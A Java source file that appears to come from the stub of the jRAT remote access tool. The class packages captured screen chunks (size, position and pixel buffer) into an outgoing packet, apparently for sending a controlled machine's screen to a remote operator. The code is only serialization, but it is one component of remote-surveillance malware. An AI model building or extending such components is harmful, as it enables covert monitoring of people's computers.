package io.jrat.stub.packets.outgoing;

import io.jrat.common.io.StringWriter;

import java.io.DataOutputStream;

public class Packet17RemoteScreen extends AbstractOutgoingPacket {

	private int chunkWidth;
	private int chunkHeight;
	private int x;
	private int y;
	private int width;
	private int height;
	private byte[] buffer;

	public Packet17RemoteScreen(int w, int h, int x, int y, int width, int height, byte[] buffer) {
		this.chunkWidth = w;
		this.chunkHeight = h;
		this.x = x;
		this.y = y;
		this.width = width;
		this.height = height;
		this.buffer = buffer;
	}

	@Override
	public void write(DataOutputStream dos, StringWriter sw) throws Exception {
		dos.writeInt(chunkWidth);
		dos.writeInt(chunkHeight);
		dos.writeInt(x);
		dos.writeInt(y);
		dos.writeInt(width);
		dos.writeInt(height);

		dos.writeInt(buffer.length);
		dos.write(buffer);
	}

	@Override
	public byte getPacketId() {
		return 17;
	}

}
